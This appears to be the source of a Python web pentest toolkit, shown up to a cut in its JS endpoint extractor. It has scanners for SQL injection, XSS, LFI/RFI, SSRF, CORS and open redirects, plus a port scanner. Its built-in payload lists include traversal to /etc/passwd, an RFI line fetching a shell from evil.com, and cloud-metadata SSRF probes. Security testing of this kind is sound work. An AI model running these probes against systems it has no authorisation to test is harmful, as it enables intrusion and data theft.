##
##   Wpen    -  Web Pentest Toolkit - 30+ tools for recon, testing, scanning and exploitation.
##   Author  :  Cr3zy
##   Version :  1.0.0
##   GitHub  :  https://github.com/Cr3zy-dev
##
##   This program is free software: you can redistribute it and/or modify
##   it under the terms of the GNU General Public License as published by
##   the Free Software Foundation, either version 3 of the License, or
##   (at your option) any later version.
##
##   This program is distributed in the hope that it will be useful,
##   but WITHOUT ANY WARRANTY; without even the implied warranty of
##   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
##   GNU General Public License for more details.
##
##   You should have received a copy of the GNU General Public License
##   along with this program. If not, see <https://www.gnu.org/licenses/>.
##
##   Copyright (C) 2025  Cr3zy
##

# Check dependencies
required_modules = [
    'colorama',
    'requests',
    're',
    'json',
    'threading',
    'socket',
    'random',
    'base64',
    'jwt',
    'statistics',
    'bs4',  # for BeautifulSoup
    'urllib.parse',  # part of standard lib, included
    'time',
    'os',
    'sys'
]

missing_modules = []

for module in required_modules:
    try:
        if module == 'bs4':
            import bs4
        elif module == 'jwt':
            import jwt
        else:
            __import__(module)
    except ImportError:
        missing_modules.append(module)

if missing_modules:
    print(f"\n [!] Missing required modules:")
    for m in missing_modules:
        print(f"     - {m}")
    print(f"\n [*] Please install them manually using pip:\n")
    print(f"     pip install {' '.join(missing_modules)}")
    input(f"\n Press ENTER to exit...")
    sys.exit()

# imports
import os
import sys
import requests
import re
import json
import threading
import socket
import random
import base64
import jwt
import statistics
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import time
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(rf"""{Fore.CYAN}

 █░█░█ █▀█ █▀▀ █▄░█
 ▀▄▀▄▀ █▀▀ ██▄ █░▀█
 """)

# Clear screen
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def url_crawler():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()
        elapsed = round(time.time() - start, 2)

        soup = BeautifulSoup(response.text, 'html.parser')
        found = set()

        for tag in soup.find_all(['a', 'form', 'script', 'link']):
            attr = 'href' if tag.name != 'form' else 'action'
            link = tag.get(attr)
            if link:
                full = urljoin(target, link)
                if urlparse(full).scheme in ['http', 'https']:
                    found.add(full)

        print(f"\n{Fore.GREEN} [+] Found {len(found)} endpoints in {elapsed}s:\n")
        for i, link in enumerate(sorted(found), 1):
            print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{link}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def subdomain_finder():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter domain (e.g. example.com): " + Fore.WHITE).strip()

    if not target:
        print(f"{Fore.RED} [!] No domain entered.")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        return main_menu()

    print(f"\n{Fore.CYAN} [?] Use custom wordlist file? (y/n): {Fore.WHITE}", end="")
    use_custom = input().strip().lower()

    wordlist = []

    if use_custom == 'y':
        path = input(Fore.CYAN + " [?] Enter path to wordlist: " + Fore.WHITE).strip()
        try:
            with open(path, 'r') as file:
                wordlist = [line.strip() for line in file if line.strip()]
        except Exception as e:
            print(f"{Fore.RED} [!] Failed to load wordlist: {e}")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            return main_menu()
    else:
        wordlist = [
            "www", "mail", "ftp", "test", "dev", "api", "admin", "blog", "portal", "staging"
        ]

    found = []
    headers = {'User-Agent': 'Mozilla/5.0'}

    print(f"\n{Fore.YELLOW} [~] Scanning subdomains for: {target} ...\n")

    for sub in wordlist:
        url = f"http://{sub}.{target}"
        try:
            response = requests.get(url, headers=headers, timeout=3)
            if response.status_code < 400:
                found.append(f"{sub}.{target}")
                print(f"{Fore.CYAN} [+] {Fore.WHITE}{sub}.{target} {Fore.GREEN}(Status: {response.status_code})")
        except requests.RequestException:
            pass

    if not found:
        print(f"{Fore.RED} [!] No subdomains found using current wordlist.")
    else:
        print(f"\n{Fore.GREEN} [+] Total found: {len(found)}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def cms_tech_detector():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Analyzing {target} ...\n")
        start = time.time()
        response = requests.get(target, headers=headers, timeout=10)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        elapsed = round(time.time() - start, 2)

        # Basic detection
        cms_found = []
        tech_stack = []

        # Meta generator
        generator = soup.find("meta", attrs={"name": "generator"})
        if generator and generator.get("content"):
            cms_found.append(generator["content"])

        # URL patterns
        known_paths = {
            "WordPress": ["/wp-login.php", "/wp-content/", "/xmlrpc.php"],
            "Joomla": ["/administrator/", "/media/system/js/"],
            "Drupal": ["/core/misc/drupal.js", "/sites/default/"],
        }
        for cms, paths in known_paths.items():
            for path in paths:
                check = urljoin(target, path)
                try:
                    r = requests.get(check, headers=headers, timeout=5)
                    if r.status_code == 200:
                        cms_found.append(cms)
                        break
                except:
                    continue

        # Headers
        header_checks = {
            "X-Powered-By": "Backend",
            "Server": "Web server",
            "X-Drupal-Cache": "Drupal",
        }
        for h in response.headers:
            for key in header_checks:
                if key.lower() in h.lower():
                    tech_stack.append(f"{key}: {response.headers[h]}")

        # Results
        print(f"{Fore.GREEN} [+] Analysis done in {elapsed}s\n")

        if cms_found:
            print(f"{Fore.CYAN} [*] Detected CMS/Platform(s):")
            for cms in set(cms_found):
                print(f"     {Fore.WHITE}- {cms}")
        else:
            print(f"{Fore.RED} [!] No CMS clearly detected.")

        if tech_stack:
            print(f"\n{Fore.CYAN} [*] Server technologies:")
            for tech in tech_stack:
                print(f"     {Fore.WHITE}- {tech}")

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def headers_cookies_analyzer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...\n")
        start = time.time()
        response = requests.get(target, headers=headers, timeout=10)
        elapsed = round(time.time() - start, 2)

        print(f"{Fore.GREEN} [+] Response received in {elapsed}s\n")

        # Print Headers
        print(f"{Fore.CYAN} [*] Response Headers:")
        for k, v in response.headers.items():
            print(f"     {Fore.WHITE}{k}: {v}")

        # Print Cookies
        print(f"\n{Fore.CYAN} [*] Cookies:")
        if response.cookies:
            for cookie in response.cookies:
                print(f"     {Fore.WHITE}{cookie.name} = {cookie.value}")
        else:
            print(f"     {Fore.YELLOW}No cookies set.")

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def request_sender():
    clear()
    banner()
    url = input(f"{Fore.CYAN} [?] Enter URL: {Fore.WHITE}").strip()
    if not url.startswith("http"):
        url = "http://" + url

    method = input(f"{Fore.CYAN} [?] Method (GET/POST/PUT/DELETE/HEAD/OPTIONS): {Fore.WHITE}").strip().upper()
    if method not in ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]:
        print(f"{Fore.RED} [!] Unsupported method.")
        return

    headers_input = input(f"{Fore.CYAN} [?] Add custom headers? (y/n): {Fore.WHITE}").strip().lower()
    headers = {}
    if headers_input == 'y':
        print(f"{Fore.YELLOW} [*] Enter headers in format: key:value (empty line to finish)")
        while True:
            line = input().strip()
            if not line:
                break
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()

    data = None
    if method in ['POST', 'PUT']:
        payload_input = input(f"{Fore.CYAN} [?] Add payload body? (y/n): {Fore.WHITE}").strip().lower()
        if payload_input == 'y':
            content_type = input(f"{Fore.CYAN} [?] Type (json/form): {Fore.WHITE}").strip().lower()
            if content_type == "json":
                raw = input(f"{Fore.YELLOW} [*] Paste JSON data:\n{Fore.WHITE}")
                try:
                    data = json.loads(raw)
                    headers['Content-Type'] = 'application/json'
                except:
                    print(f"{Fore.RED} [!] Invalid JSON.")
                    return
            else:
                print(f"{Fore.YELLOW} [*] Enter form fields in format: key=value (empty line to finish)")
                data = {}
                while True:
                    line = input().strip()
                    if not line:
                        break
                    if '=' in line:
                        key, value = line.split('=', 1)
                        data[key.strip()] = value.strip()

    try:
        print(f"{Fore.YELLOW} [~] Sending {method} request to {url} ...")
        start = time.time()
        response = requests.request(method, url, headers=headers, json=data if headers.get('Content-Type') == 'application/json' else None, data=data if headers.get('Content-Type') != 'application/json' else None, timeout=15)
        elapsed = round(time.time() - start, 2)

        # Status
        color = Fore.GREEN if 200 <= response.status_code < 300 else Fore.YELLOW if 300 <= response.status_code < 400 else Fore.RED
        print(f"\n{color} [+] Status: {response.status_code} {response.reason} ({elapsed}s)")

        # Headers
        print(f"\n{Fore.CYAN} [*] Response Headers:")
        for k, v in response.headers.items():
            print(f"     {k}: {v}")

        # Cookies
        if response.cookies:
            print(f"\n{Fore.CYAN} [*] Cookies:")
            for k, v in response.cookies.items():
                print(f"     {k} = {v}")

        # Body (truncated)
        if response.text:
            print(f"\n{Fore.CYAN} [*] Response Body (first 500 chars):")
            print(Fore.WHITE + response.text[:500].strip() + ('...' if len(response.text) > 500 else ''))

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def form_scanner():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Fetching forms from {target} ...\n")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        elapsed = round(time.time() - start, 2)

        forms = soup.find_all("form")
        print(f"{Fore.GREEN} [+] Found {len(forms)} form(s) in {elapsed}s\n")

        if not forms:
            print(f"{Fore.YELLOW} [-] No forms detected on the page.")
        for i, form in enumerate(forms, 1):
            print(f"{Fore.CYAN} --- Form #{i} ---")
            print(f"{Fore.WHITE} Action : {form.get('action')}")
            print(f"{Fore.WHITE} Method : {form.get('method', 'GET').upper()}")
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            if inputs:
                print(f"{Fore.CYAN}  Fields:")
                for inp in inputs:
                    tag_name = inp.name
                    name = inp.get('name')
                    input_type = inp.get('type', 'textarea/select' if tag_name != 'input' else 'text')
                    print(f"    - {tag_name.upper()} | name='{name}' | type='{input_type}'")
            else:
                print(f"{Fore.YELLOW}  No input fields found.")

            print('')

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def sqli_tester():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    use_custom = input(Fore.CYAN + " [?] Use custom payloads from a wordlist? (y/n): " + Fore.WHITE).strip().lower()
    
    if use_custom == "y":
        path = input(Fore.CYAN + " [?] Enter path to wordlist file: " + Fore.WHITE).strip()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN} [+] Loaded {len(payloads)} payloads from wordlist.\n")
        except FileNotFoundError:
            print(f"{Fore.RED} [!] File not found: {path}")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
    else:
        payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            '" OR "1"="1',
            "') OR ('1'='1"
        ]
        print(f"{Fore.YELLOW} [~] Using default payload list ({len(payloads)} payloads).\n")

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(target, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all("form")
        print(f"{Fore.GREEN} [+] Found {len(forms)} form(s)\n")

        if not forms:
            print(f"{Fore.YELLOW} [-] No forms to test.")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()

        for i, form in enumerate(forms, 1):
            print(f"{Fore.CYAN} --- Testing Form #{i} ---")
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])

            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                if not name:
                    continue
                form_data[name] = "test"

            url = urljoin(target, action)

            for payload in payloads:
                test_data = {k: payload for k in form_data}
                if method == "post":
                    res = requests.post(url, data=test_data, headers=headers)
                else:
                    res = requests.get(url, params=test_data, headers=headers)

                if re.search(r"(sql syntax|warning|mysql|ORA-|You have an error)", res.text, re.IGNORECASE):
                    print(f"{Fore.GREEN} [+] Potential SQL Injection with payload: {payload}")
                    print(f"{Fore.WHITE}     → URL: {url}")
                    break
            else:
                print(f"{Fore.RED} [-] No SQL injection signs detected in this form.")
            print("")

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def xss_tester():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL (with parameter, e.g. ?q=): " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    # Payload list
    use_custom = input(Fore.CYAN + " [?] Use custom payload list? (y/n): " + Fore.WHITE).lower().strip() == 'y'
    if use_custom:
        path = input(Fore.CYAN + " [?] Enter path to your custom payload file: " + Fore.WHITE).strip()
        try:
            with open(path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED} [!] Could not read payload file: {e}")
            input(f"{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
            return
    else:
        payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>"
        ]

    headers = {'User-Agent': 'Mozilla/5.0'}
    vuln_count = 0

    try:
        print(f"{Fore.YELLOW} [~] Testing XSS payloads...\n")
        start = time.time()

        for payload in payloads:
            test_url = target.replace("PARAMX", requests.utils.quote(payload))
            response = requests.get(test_url, headers=headers, timeout=10)
            if payload in response.text:
                vuln_count += 1
                print(f"{Fore.GREEN} [+] Payload reflected! --> {payload}")
                print(f"{Fore.CYAN}     URL: {test_url}\n")

        elapsed = round(time.time() - start, 2)
        print(f"{Fore.GREEN} [+] Done. {vuln_count} reflected payload(s) in {elapsed}s.")

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def dir_bruteforcer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    use_custom = input(Fore.CYAN + " [?] Use custom wordlist? (y/n): " + Fore.WHITE).strip().lower()

    if use_custom == "y":
        path = input(Fore.CYAN + " [?] Enter path to wordlist file: " + Fore.WHITE).strip()
        if not os.path.isfile(path):
            print(f"{Fore.RED} [!] Wordlist not found: {path}")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN} [+] Loaded {len(wordlist)} paths from wordlist.\n")
    else:
        wordlist = [
            "admin", "login", "backup", "test", "config", "uploads", 
            "images", "include", "robots.txt", ".git", ".env"
        ]
        print(f"{Fore.YELLOW} [~] Using default wordlist ({len(wordlist)} entries).\n")

    headers = {'User-Agent': 'Mozilla/5.0'}
    found = []
    forbidden = []
    lock = threading.Lock()
    max_threads = 30

    def scan_path(path):
        url = urljoin(target, path)
        try:
            res = requests.get(url, headers=headers, timeout=5)
            with lock:
                if res.status_code < 400:
                    found.append((url, res.status_code))
                    print(f"{Fore.CYAN} [+] {Fore.WHITE}Found: {url} {Fore.GREEN}[{res.status_code}]")
                elif res.status_code == 403:
                    forbidden.append((url, res.status_code))
        except:
            pass

    print(f"{Fore.YELLOW} [~] Starting scan using {max_threads} threads...\n")
    start = time.time()

    threads_list = []
    for word in wordlist:
        t = threading.Thread(target=scan_path, args=(word,))
        t.start()
        threads_list.append(t)
        while threading.active_count() > max_threads:
            time.sleep(0.1)

    for t in threads_list:
        t.join()

    elapsed = round(time.time() - start, 2)
    print(f"\n{Fore.GREEN} [+] Scan complete in {elapsed}s. {len(found)} valid paths found.")

    if forbidden:
        show_forbidden = input(f"{Fore.YELLOW} [?] Show forbidden (403) results? (y/n): {Fore.WHITE}").strip().lower()
        if show_forbidden == "y":
            print(f"\n{Fore.RED} [!] Forbidden (403) paths:\n")
            for url, code in forbidden:
                print(f"{Fore.RED} [!] {Fore.WHITE}{url} {Fore.RED}[{code}]")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def wordpress_scanner():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter WordPress site URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    headers = {'User-Agent': 'Mozilla/5.0'}
    found_plugins = set()
    found_themes = set()
    wp_version = "Unknown"

    try:
        print(f"{Fore.YELLOW} [~] Scanning {target} ...")
        start = time.time()
        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        # --- Version detection ---
        gen = soup.find("meta", attrs={"name": "generator"})
        if gen and "WordPress" in gen.get("content", ""):
            wp_version = gen['content'].split()[-1]

        # Try common readme path
        readme_url = urljoin(target, "readme.html")
        try:
            readme = requests.get(readme_url, headers=headers, timeout=5)
            if "WordPress" in readme.text:
                match = re.search(r'Version\s+([\d.]+)', readme.text)
                if match:
                    wp_version = match.group(1)
        except:
            pass

        print(f"\n{Fore.CYAN} [+] WordPress version: {Fore.GREEN}{wp_version}")

        # --- Plugin & Theme Detection ---
        for link in soup.find_all(["link", "script"]):
            src = link.get("href") or link.get("src")
            if not src:
                continue
            if "/wp-content/plugins/" in src:
                plugin = src.split("/wp-content/plugins/")[1].split("/")[0]
                found_plugins.add(plugin)
            elif "/wp-content/themes/" in src:
                theme = src.split("/wp-content/themes/")[1].split("/")[0]
                found_themes.add(theme)

        print(f"\n{Fore.CYAN} [+] Detected Plugins ({len(found_plugins)}):")
        for p in sorted(found_plugins):
            print(f"{Fore.WHITE}    - {p}")

        print(f"\n{Fore.CYAN} [+] Detected Themes ({len(found_themes)}):")
        for t in sorted(found_themes):
            print(f"{Fore.WHITE}    - {t}")

        elapsed = round(time.time() - start, 2)
        print(f"\n{Fore.GREEN} [+] Scan completed in {elapsed}s.")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def port_scanner():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target IP or domain (e.g. example.com): " + Fore.WHITE).strip()

    # Resolve host to IP
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"{Fore.RED} [!] Invalid host: {target}")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        main_menu()

    try:
        port_range = input(Fore.CYAN + " [?] Port range (e.g. 1-1000): " + Fore.WHITE).strip()
        start_port, end_port = map(int, port_range.split("-"))
    except:
        print(f"{Fore.RED} [!] Invalid port range format.")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        main_menu()

    open_ports = []
    print(f"{Fore.YELLOW} [~] Scanning {ip} from port {start_port} to {end_port} ...")
    start = time.time()

    lock = threading.Lock()

    def scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((ip, port))
            if result == 0:
                with lock:
                    open_ports.append(port)
            s.close()
        except:
            pass

    threads = []
    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=scan, args=(port,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = round(time.time() - start, 2)
    print(f"\n{Fore.GREEN} [+] Scan completed in {elapsed}s.")
    if open_ports:
        print(f"\n{Fore.CYAN} [+] Open ports:")
        for port in sorted(open_ports):
            print(f"{Fore.WHITE}    - Port {port}")
    else:
        print(f"{Fore.YELLOW} [-] No open ports detected in range.")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def lfi_rfi_scanner():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter vulnerable URL (e.g., http://site.com/page.php?file=): " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    param_match = re.search(r"\?(.*?)=", target)
    if not param_match:
        print(f"{Fore.RED} [!] URL must contain a parameter (e.g., ?file=)")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        main_menu()

    param = param_match.group(1)

    use_custom = input(Fore.CYAN + " [?] Use custom payload wordlist? (y/n): " + Fore.WHITE).strip().lower()

    if use_custom == "y":
        path = input(Fore.CYAN + " [?] Enter path to wordlist file: " + Fore.WHITE).strip()
        if not os.path.isfile(path):
            print(f"{Fore.RED} [!] Wordlist not found: {path}")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN} [+] Loaded {len(payloads)} payloads from wordlist.\n")
    else:
        payloads = [
            "../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "php://input",
            "php://filter/convert.base64-encode/resource=index.php",
            "http://evil.com/shell.txt"
        ]
        print(f"{Fore.YELLOW} [~] Using default payloads ({len(payloads)} entries).\n")

    headers = {'User-Agent': 'Mozilla/5.0'}
    hits = []

    for payload in payloads:
        full_url = re.sub(rf"{param}=[^&]*", f"{param}={payload}", target)
        try:
            res = requests.get(full_url, headers=headers, timeout=7)
            indicators = ["root:x:0:0:", "[extensions]", "<?php", "fread(", "404 Not Found"]
            if any(ind in res.text for ind in indicators):
                print(f"{Fore.GREEN} [+] Possible LFI/RFI detected with payload: {Fore.WHITE}{payload}")
                print(f"     → URL: {full_url}")
                hits.append(full_url)
        except requests.RequestException:
            pass

    if not hits:
        print(f"{Fore.RED} [-] No LFI/RFI patterns detected.")
    
    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def cors_checker():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Origin': 'http://evil.com'
    }

    try:
        print(f"{Fore.YELLOW} [~] Sending request with spoofed Origin header to {target} ...")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10)
        elapsed = round(time.time() - start, 2)

        acao = response.headers.get('Access-Control-Allow-Origin')
        acac = response.headers.get('Access-Control-Allow-Credentials')

        print(f"\n{Fore.CYAN} --- CORS Response Headers ---")
        print(f"{Fore.WHITE} Access-Control-Allow-Origin: {Fore.YELLOW}{acao}")
        print(f"{Fore.WHITE} Access-Control-Allow-Credentials: {Fore.YELLOW}{acac}")
        print(f"{Fore.WHITE} Response Time: {Fore.YELLOW}{elapsed}s")

        print(f"\n{Fore.CYAN} --- Analysis ---")
        if acao == "http://evil.com":
            print(f"{Fore.RED} [!] Vulnerable: Origin reflects arbitrary domain (http://evil.com).")
            if acac == "true":
                print(f"{Fore.RED} [!] Also allows credentials - HIGH risk of CORS hijack!")
            else:
                print(f"{Fore.YELLOW} [-] Credentials not allowed, but reflection is still risky.")
        else:
            print(f"{Fore.GREEN} [+] No dangerous reflection detected.")

    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def open_redirect_tester():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL (e.g., https://example.com/page?redirect=): " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    payloads = [
        "//evil.com",
        "/\\evil.com",
        "https://evil.com",
        "http://evil.com",
        "///evil.com",
    ]

    print(f"{Fore.YELLOW} [~] Testing for open redirects...\n")

    headers = {'User-Agent': 'Mozilla/5.0'}
    vulnerable = False

    for payload in payloads:
        parsed = list(urlparse(target))
        query = parsed[4]  # index 4 = query string
        if not query:
            print(f"{Fore.RED} [!] URL does not contain query parameters to test.")
            break

        # Modify all known redirect parameters
        params = dict(re.findall(r'(\w+)=([^&]*)', query))
        for key in params:
            if key.lower() in ['redirect', 'url', 'next', 'continue', 'dest']:
                test_params = params.copy()
                test_params[key] = payload
                parsed[4] = urlencode(test_params)
                test_url = urlunparse(parsed)

                try:
                    response = requests.get(test_url, headers=headers, allow_redirects=False, timeout=5)
                    loc = response.headers.get("Location", "")
                    if "evil.com" in loc:
                        print(f"{Fore.RED} [!] Possible Open Redirect at: {Fore.WHITE}{test_url}")
                        print(f"{Fore.YELLOW}     → Redirects to: {loc}\n")
                        vulnerable = True
                except Exception as e:
                    print(f"{Fore.RED} [!] Request error: {e}")
    
    if not vulnerable:
        print(f"{Fore.GREEN} [+] No open redirect behavior detected.\n")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def ssrf_tester():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL (must contain parameter like ?url=): " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",  # AWS Metadata
        "http://[::1]",
        "http://0.0.0.0",
        f"http://{random.randint(1, 255)}.dnslog.cn",  # logger
        f"http://{random.randint(1, 255)}.interact.sh"  # Altenrative
    ]

    print(f"{Fore.YELLOW} [~] Testing SSRF on: {target}\n")

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}

        vulnerable = False
        for payload in payloads:
            test_url = inject_payload(target, payload)

            print(f"{Fore.CYAN} [*] Testing with: {payload}")
            try:
                res = requests.get(test_url, headers=headers, timeout=5, allow_redirects=False)
                if "localhost" in res.text or res.status_code in [200, 302]:
                    print(f"{Fore.GREEN} [+] Possible SSRF behavior detected!")
                    vulnerable = True
            except requests.exceptions.RequestException:
                print(f"{Fore.RED} [!] Request failed for {payload}")
            time.sleep(0.8)

        if not vulnerable:
            print(f"{Fore.YELLOW} [-] No SSRF signs detected (manual verification recommended).")

    except Exception as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def inject_payload(base_url, payload):
    if "?" not in base_url:
        return base_url
    parts = base_url.split("?")
    query = parts[1]
    modified = []
    for param in query.split("&"):
        if any(k in param.lower() for k in ["url", "link", "target"]):
            k = param.split("=")[0]
            modified.append(f"{k}={payload}")
        else:
            modified.append(param)
    return f"{parts[0]}?{'&'.join(modified)}"

def csp_analyzer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...")
        start = time.time()
        response = requests.get(target, headers=headers, timeout=10)
        elapsed = round(time.time() - start, 2)

        csp_header = response.headers.get("Content-Security-Policy")
        print(f"\n{Fore.GREEN} [+] Response received in {elapsed}s\n")

        if not csp_header:
            print(f"{Fore.RED} [!] No CSP header set! This is a security risk.")
        else:
            print(f"{Fore.CYAN} --- CSP Header ---")
            print(f"{Fore.WHITE}{csp_header}\n")
            print(f"{Fore.CYAN} --- Analysis ---")

            issues = []

            if "'unsafe-inline'" in csp_header:
                issues.append("[-] Uses 'unsafe-inline' (allows inline JS/CSS execution)")

            if "'unsafe-eval'" in csp_header:
                issues.append("[-] Uses 'unsafe-eval' (allows eval-like JS)")

            if "*" in csp_header:
                issues.append("[!] Wildcard * used - allows resources from any origin")

            if "data:" in csp_header or "blob:" in csp_header:
                issues.append("[!] Allows data: or blob: sources (can be dangerous)")

            if not any(d in csp_header for d in ['default-src', 'script-src', 'object-src']):
                issues.append("[!] Missing important directives (default-src/script-src)")

            if not issues:
                print(f"{Fore.GREEN} [+] No dangerous patterns detected.")
            else:
                for issue in issues:
                    print(f"{Fore.YELLOW} - {issue}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def js_endpoint_extractor():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        print(f"{Fore.YELLOW} [~] Scanning {target} for JavaScript files ...")
        start = time.time()
        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        js_links = set()

        for tag in soup.find_all("script"):
            src = tag.get("src")
            if src:
                full_url = urljoin(target, src)
